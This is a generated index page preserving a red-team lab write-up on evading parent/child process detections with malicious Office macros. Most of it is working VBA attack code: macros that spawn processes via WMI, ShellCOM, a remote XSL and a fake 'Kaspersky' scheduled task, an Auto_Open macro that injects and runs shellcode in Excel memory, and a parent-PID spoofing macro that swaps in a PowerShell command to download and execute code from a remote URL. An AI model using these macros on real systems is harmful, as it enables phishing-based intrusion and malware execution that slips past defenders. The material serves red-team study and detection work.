---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Bypassing Parent Child / Ancestry Detections

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-initial-access-phishing-with-ms-office-bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/phishing-with-ms-office/bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Bypassing Parent Child / Ancestry Detections](../../topics/offensive-security/bypassing-parent-child-ancestry-detections.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-initial-access-phishing-with-ms-office-bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships |
| name | Bypassing Parent Child / Ancestry Detections |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/initial-access/phishing-with-ms-office/bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2019-04-10 22-35.gif
- Screenshot from 2019-04-10 22-11-41.png
- Screenshot from 2019-04-10 22-19-03.png
- Screenshot from 2019-04-10 22-36-03.png
- Screenshot from 2019-04-10 22-49-40.png
- Screenshot from 2019-04-10 23-04-07.png
_body: "# Bypassing Parent Child / Ancestry Detections\n\nDefenders often engineer detections based on parent/child process\
  \ relationships - i.e Excel spawns powershell - suspicious.\n\nThis lab is mostly based on the techniques discussed on [https://www.countercept.com/blog/dechaining-macros-and-evading-edr/](https://www.countercept.com/blog/dechaining-macros-and-evading-edr/)\n\
  \nBelow are some techniques showing how those type of detections could be bypassed.&#x20;\n\n## Spawning via WmiPrvse.exe\
  \ using wmi\n\n{% code title=\"macro.vba\" %}\n```javascript\nSet objWMIService = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\
  \\.\\root\\cimv2\")\nSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\nSet objConfig = objStartup.SpawnInstance_\n\
  Set objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")\nerrReturn = objProcess.Create(\"calc\", Null, objConfig,\
  \ intProcessID)\n```\n{% endcode %}\n\n![](<../../../.gitbook/assets/Screenshot from 2019-04-10 22-11-41.png>)\n\n## Spawning\
  \ via ShellCOM\n\n{% code title=\"macro.vba\" %}\n```csharp\nSet obj = GetObject(\"new:C08AFD90-F2A1-11D1-8455-00A0C91F3880\"\
  )\nobj.Document.Application.ShellExecute \"calc\",Null,\"C:\\\\Windows\\\\System32\",Null,0\n```\n{% endcode %}\n\n## Spawning\
  \ via svchost.exe using XMLDOM\n\n{% tabs %}\n{% tab title=\"xmldom.vba\" %}\n```csharp\nSet xml = CreateObject(\"Microsoft.XMLDOM\"\
  )\nxml.async = False\nSet xsl = xml\nxsl.load(\"file://|http://bad.xsl\")\nxml.transformNode xsl\n```\n{% endtab %}\n\n\
  {% tab title=\"bad.xsl\" %}\n```markup\n<?xml version='1.0'?>\n<stylesheet\nxmlns=\"http://www.w3.org/1999/XSL/Transform\"\
  \ xmlns:ms=\"urn:schemas-microsoft-com:xslt\"\nxmlns:user=\"placeholder\"\nversion=\"1.0\">\n<output method=\"text\"/>\n\
  \t<ms:script implements-prefix=\"user\" language=\"JScript\">\n\t<![CDATA[\n\tvar r = new ActiveXObject(\"WScript.Shell\"\
  ).Run(\"calc\");\n\t]]> </ms:script>\n</stylesheet>\n```\n{% endtab %}\n{% endtabs %}\n\n![](<../../../.gitbook/assets/Screenshot\
  \ from 2019-04-10 23-04-07.png>)\n\n## Spawning via svchost.exe using Scheduled Task\n\n{% code title=\"macro.vba\" %}\n\
  ```csharp\nSet service = CreateObject(\"Schedule.Service\")\nCall service.Connect\nDim td: Set td = service.NewTask(0)\n\
  td.RegistrationInfo.Author = \"Kaspersky Corporation\"\ntd.settings.StartWhenAvailable = True\ntd.settings.Hidden = False\n\
  Dim triggers: Set triggers = td.triggers\nDim trigger: Set trigger = triggers.Create(1)\nDim startTime: ts = DateAdd(\"\
  s\", 30, Now)\nstartTime = Year(ts) & \"-\" & Right(Month(ts), 2) & \"-\" & Right(Day(ts), 2) & \"T\" & Right(Hour(ts),\
  \ 2) & \":\" & Right(Minute(ts), 2) & \":\" & Right(Second(ts), 2)\ntrigger.StartBoundary = startTime\ntrigger.ID = \"TimeTriggerId\"\
  \nDim Action: Set Action = td.Actions.Create(0)\nAction.Path = \"C:\\Windows\\System32\\cmd.exe\"\n'Action.Arguments = \"\
  /c whoami\"\nCall service.GetFolder(\"\\\").RegisterTaskDefinition(\"AVUpdateTask\", td, 6, , , 3)\n```\n{% endcode %}\n\
  \n![](<../../../.gitbook/assets/Screenshot from 2019-04-10 22-19-03.png>)\n\n## Shellcode Injection to Excel.exe Memory\
  \ Using Windows APIs\n\n```csharp\nPrivate Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal Zopqv As Long,\
  \ ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\nPrivate Declare\
  \ PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal\
  \ Rso As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal Dkhnszol As LongPtr, ByRef\
  \ Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\nPrivate Declare Function CreateThread Lib \"kernel32\" (ByVal Zopqv\
  \ As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\nPrivate\
  \ Declare Function VirtualAlloc Lib \"kernel32\" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal\
  \ Rso As Long) As Long\nPrivate Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal Dkhnszol As Long, ByRef Wwgtgy As\
  \ Any, ByVal Hrkmuos As Long) As Long\n\nSub Auto_Open()\n        Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi\
  \ As Long, Zolde As Long\n#If Vba7 Then\n        Dim  Xlbufvetp As LongPtr\n#Else\n        Dim  Xlbufvetp As Long\n#EndIf\n\
  \        Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207,\
  \ _\n13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1,\
  \ _\n214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,\
  \ _\n139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187,\
  \ _\n224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n\
  \        Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &H1000, &H40)\n        For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n\
  \                Wyzayxya = Hyeyhafxp(Zolde)\n                Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n\
  \        Next Zolde\n        Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\nEnd Sub\n```\n\n![](<../../../.gitbook/assets/Peek\
  \ 2019-04-10 22-35.gif>)\n\n![TCP session from Excel.exe](<../../../.gitbook/assets/Screenshot from 2019-04-10 22-36-03.png>)\n\
  \n## Parent Process ID Spoofing\n\nWith this technique it is possible to specify the PID under which our process will be\
  \ launched as well as process commandline arguments can be spoofed. Note that this is the same technique Cobalt Strike uses\
  \ under the hood in its `argue` module:\n\n```csharp\n' code from https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/\n\
  ' Windows API constants\n\nConst EXTENDED_STARTUPINFO_PRESENT = &H80000\nConst HEAP_ZERO_MEMORY = &H8&\nConst SW_HIDE =\
  \ &H0&\nConst PROCESS_ALL_ACCESS = &H1F0FFF\nConst PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = &H20000\nConst TH32CS_SNAPPROCESS\
  \ = &H2&\nConst MAX_PATH = 260\n\n\n'''''''''''''''''''''''''''''''''''''''''''''''''''\n''''''''''''''' Data types ''''''''''''''''''''''''\n\
  '''''''''''''''''''''''''''''''''''''''''''''''''''\n \n\n\nPrivate Type PROCESS_INFORMATION\n    hProcess As LongPtr\n\
  \    hThread As LongPtr\n    dwProcessId As Long\n    dwThreadId As Long\nEnd Type\n\n\nPrivate Type STARTUP_INFO\n    cb\
  \ As Long\n    lpReserved As String\n    lpDesktop As String\n    lpTitle As String\n    dwX As Long\n    dwY As Long\n\
  \    dwXSize As Long\n    dwYSize As Long\n    dwXCountChars As Long\n    dwYCountChars As Long\n    dwFillAttribute As\
  \ Long\n    dwFlags As Long\n    wShowWindow As Integer\n    cbReserved2 As Integer\n    lpReserved2 As Byte\n    hStdInput\
  \ As LongPtr\n    hStdOutput As LongPtr\n    hStdError As LongPtr\nEnd Type\n \nPrivate Type STARTUPINFOEX\n    STARTUPINFO\
  \ As STARTUP_INFO\n    lpAttributelist As LongPtr\nEnd Type\n\n' from https://codes-sources.commentcamarche.net/source/42365-affinite-des-processus-et-des-threads\n\
  Private Type PROCESS_BASIC_INFORMATION\n    ExitStatus      As Long\n    PEBBaseAddress  As Long\n    AffinityMask    As\
  \ Long\n    BasePriority    As Long\n    UniqueProcessId As Long\n    ParentProcessId As Long\nEnd Type\n\n\nPrivate Declare\
  \ Function NtQueryInformationProcess Lib \"ntdll.dll\" ( _\n   ByVal processHandle As LongPtr, _\n   ByVal processInformationClass\
  \ As Long, _\n   ByRef processInformation As PROCESS_BASIC_INFORMATION, _\n   ByVal processInformationLength As Long, _\n\
  \   ByRef returnLength As Long _\n) As Integer\n\n\n' From https://foren.activevb.de/archiv/vb-net/thread-76040/beitrag-76164/ReadProcessMemory-fuer-GetComma/\n\
  Private Type PEB\n    Reserved1(1) As Byte\n    BeingDebugged As Byte\n    Reserved2 As Byte\n    Reserved3(1) As Long\n\
  \    Ldr As Long\n    ProcessParameters As Long\n    Reserved4(103) As Byte\n    Reserved5(51) As Long\n    PostProcessInitRoutine\
  \ As Long\n    Reserved6(127) As Byte\n    Reserved7 As Long\n    SessionId As Long\nEnd Type\n\n\nPrivate Type UNICODE_STRING\n\
  \    Length As Integer\n    MaximumLength As Integer\n    Buffer As Long\n    ' to change ^ to Long\nEnd Type\n\nPrivate\
  \ Type RTL_USER_PROCESS_PARAMETERS\n    Reserved1(15) As Byte\n    Reserved2(9) As Long\n    ImagePathName As UNICODE_STRING\n\
  \    CommandLine As UNICODE_STRING\nEnd Type\n\n\nPrivate Type PROCESSENTRY32\n    dwSize As Long\n    cntUsage As Long\n\
  \    th32ProcessID As Long\n    th32DefaultHeapID As Long\n    th32ModuleID As Long\n    cntThreads As Long\n    th32ParentProcessID\
  \ As Long\n    pcPriClassBase As Long\n    dwFlags As Long\n    szexeFile As String * MAX_PATH\nEnd Type\n\n\n'''''''''''''''''''''''''''''''''''''''''''''''''''''\n\
  ''''''''''''' kernel32 & ntdll bindings '''''''''''''\n'''''''''''''''''''''''''''''''''''''''''''''''''''''\n\nPrivate\
  \ Declare PtrSafe Function CreateProcess Lib \"kernel32.dll\" Alias \"CreateProcessA\" ( _\n    ByVal lpApplicationName\
  \ As String, _\n    ByVal lpCommandLine As String, _\n    lpProcessAttributes As Long, _\n    lpThreadAttributes As Long,\
  \ _\n    ByVal bInheritHandles As Long, _\n    ByVal dwCreationFlags As Long, _\n    lpEnvironment As Any, _\n    ByVal\
  \ lpCurrentDriectory As String, _\n    ByVal lpStartupInfo As LongPtr, _\n    lpProcessInformation As PROCESS_INFORMATION\
  \ _\n) As Long\n\n\nPrivate Declare PtrSafe Function OpenProcess Lib \"kernel32.dll\" ( _\n    ByVal dwAccess As Long, _\n\
  \    ByVal fInherit As Integer, _\n    ByVal hObject As Long _\n) As Long\n \n\nPrivate Declare PtrSafe Function HeapAlloc\
  \ Lib \"kernel32.dll\" ( _\n    ByVal hHeap As LongPtr, _\n    ByVal dwFlags As Long, _\n    ByVal dwBytes As Long _\n)\
  \ As LongPtr\n\n\nPrivate Declare PtrSafe Function GetProcessHeap Lib \"kernel32.dll\" () As LongPtr\n\n\nPrivate Declare\
  \ PtrSafe Function InitializeProcThreadAttributeList Lib \"kernel32.dll\" ( _\n    ByVal lpAttributelist As LongPtr, _\n\
  \    ByVal dwAttributeCount As Integer, _\n    ByVal dwFlags As Integer, _\n    ByRef lpSize As Integer _\n) As Boolean\n\
  \n\nPrivate Declare PtrSafe Function UpdateProcThreadAttribute Lib \"kernel32.dll\" ( _\n    ByVal lpAttributelist As LongPtr,\
  \ _\n    ByVal dwFlags As Integer, _\n    ByVal lpAttribute As Long, _\n    ByRef lpValue As Long, _\n    ByVal cbSize As\
  \ Integer, _\n    ByRef lpPreviousValue As Integer, _\n    ByRef lpReturnSize As Integer _\n) As Boolean\n\nPrivate Declare\
  \ PtrSafe Function CreateToolhelp32Snapshot Lib \"kernel32.dll\" ( _\n    ByVal dwFlags As Integer, _\n    ByVal th32ProcessID\
  \ As Integer _\n) As Long\n \nPrivate Declare PtrSafe Function Process32First Lib \"kernel32.dll\" ( _\n    ByVal hSnapshot\
  \ As LongPtr, _\n    ByRef lppe As PROCESSENTRY32 _\n) As Boolean\n \nPrivate Declare PtrSafe Function Process32Next Lib\
  \ \"kernel32.dll\" ( _\n    ByVal hSnapshot As LongPtr, _\n    ByRef lppe As PROCESSENTRY32 _\n) As Boolean\n\n\nPrivate\
  \ Declare Function ReadProcessMemory Lib \"kernel32.dll\" ( _\n    ByVal hProcess As LongPtr, _\n    ByVal lpBaseAddress\
  \ As LongPtr, _\n    ByVal lpBuffer As LongPtr, _\n    ByVal nSize As Long, _\n    ByRef lpNumberOfBytesRead As Long _\n\
  ) As Boolean\n\nPrivate Declare Function WriteProcessMemory Lib \"kernel32.dll\" ( _\n    ByVal hProcess As LongPtr, _\n\
  \    ByVal lpBaseAddress As Long, _\n    ByVal lpBuffer As Any, _\n    ByVal nSize As Long, _\n    ByRef lpNumberOfBytesWritten\
  \ As Long _\n) As Boolean\n\n\nPrivate Declare Function ResumeThread Lib \"kernel32.dll\" (ByVal hThread As LongPtr) As\
  \ Long\n\n\n'''''''''''''''''''''''''''''''''''''''''''''''\n'''''''''''''' Utility functions ''''''''''''''\n'''''''''''''''''''''''''''''''''''''''''''''''\n\
  \n' Finds the PID of a process given its name\nPublic Function getPidByName(ByVal name As String) As Integer\n    Dim pEntry\
  \ As PROCESSENTRY32\n    Dim continueSearching As Boolean\n    pEntry.dwSize = Len(pEntry)\n    Dim snapshot As LongPtr\n\
  \n    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ByVal 0&)\n \n    continueSearching = Process32First(snapshot,\
  \ pEntry)\n \n    Do\n        If Left$(pEntry.szexeFile, Len(name)) = LCase$(name) Then\n            getPidByName = pEntry.th32ProcessID\n\
  \            continueSearching = False\n        Else\n            continueSearching = Process32Next(snapshot, pEntry)\n\
  \        End If\n    Loop While continueSearching\nEnd Function\n\nPublic Function convertStr(ByVal str As String) As Byte()\n\
  \    Dim i, j As Integer\n    Dim result(400) As Byte\n    j = 0\n    For i = 1 To Len(str):\n        result(j) = Asc(Mid(str,\
  \ i, 1))\n        result(j + 1) = &H0\n        j = j + 2\n    Next\n    \n    convertStr = result\n    \nEnd Function\n\n\
  Sub AutoOpen()\n    Dim pi As PROCESS_INFORMATION\n    Dim si As STARTUPINFOEX\n    Dim nullStr As String\n    Dim pid,\
  \ result As Integer\n    Dim threadAttribSize As Integer\n    Dim parentHandle As LongPtr\n    Dim originalCli As String\n\
  \    \n    originalCli = \"powershell.exe -NoExit -c Get-Service -DisplayName '*network*' | Where-Object { $_.Status -eq\
  \ 'Running' } | Sort-Object DisplayName\"\n    \n    ' Get a handle on the process to be used as a parent\n    pid = getPidByName(\"\
  explorer.exe\")\n    parentHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)\n\n    ' Initialize process attribute list\n\
  \    result = InitializeProcThreadAttributeList(ByVal 0&, 1, 0, threadAttribSize)\n    si.lpAttributelist = HeapAlloc(GetProcessHeap(),\
  \ HEAP_ZERO_MEMORY, threadAttribSize)\n    result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize)\n\
  \n    ' Set the parent to be our previous handle\n    result = UpdateProcThreadAttribute(si.lpAttributelist, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,\
  \ parentHandle, Len(parentHandle), ByVal 0&, ByVal 0&)\n\n    ' Set the size of cb (see https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-_startupinfoexa#remarks)\n\
  \    si.STARTUPINFO.cb = LenB(si)\n    \n    ' Hide new process window\n    si.STARTUPINFO.dwFlags = 1\n    si.STARTUPINFO.wShowWindow\
  \ = SW_HIDE\n\n    result = CreateProcess( _\n        nullStr, _\n        originalCli, _\n        ByVal 0&, _\n        ByVal\
  \ 0&, _\n        1&, _\n        &H80014, _\n        ByVal 0&, _\n        nullStr, _\n        VarPtr(si), _\n        pi _\n\
  \    )\n    \n    ' Spoofing of cli arguments\n    Dim size As Long\n    Dim PEB As PEB\n    Dim pbi As PROCESS_BASIC_INFORMATION\n\
  \    Dim newProcessHandle As LongPtr\n    Dim success As Boolean\n    Dim parameters As RTL_USER_PROCESS_PARAMETERS\n  \
  \  Dim cmdStr As String\n    Dim cmd() As Byte\n    \n    newProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pi.dwProcessId)\n\
  \    result = NtQueryInformationProcess(newProcessHandle, 0, pbi, Len(pbi), size)\n    success = ReadProcessMemory(newProcessHandle,\
  \ pbi.PEBBaseAddress, VarPtr(PEB), Len(PEB), size)\n    ' peb.ProcessParameters now contains the address to the parameters\
  \ - read them\n    success = ReadProcessMemory(newProcessHandle, PEB.ProcessParameters, VarPtr(parameters), Len(parameters),\
  \ size)\n    \n    cmdStr = \"powershell.exe -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('http://bit.ly/2TxpA4h'))\
  \ # \"\n    cmd = convertStr(cmdStr)\n    success = WriteProcessMemory(newProcessHandle, parameters.CommandLine.Buffer,\
  \ StrPtr(cmd), 2 * Len(cmdStr), size)\n    ResumeThread (pi.hThread) \nEnd Sub\n```\n\n![](<../../../.gitbook/assets/Screenshot\
  \ from 2019-04-10 22-49-40.png>)\n\n## References\n\n{% embed url=\"https://www.countercept.com/blog/dechaining-macros-and-evading-edr/\"\
  \ %}\n\n{% embed url=\"https://blog.didierstevens.com/2008/10/23/excel-exercises-in-style/\" %}\n\n{% embed url=\"https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/\"\
  \ %}\n\n{% embed url=\"https://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/\" %}\n\n{% embed url=\"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/\"\
  \ %}"
_relative_path: offensive-security/initial-access/phishing-with-ms-office/bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/phishing-with-ms-office/bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships.md
````
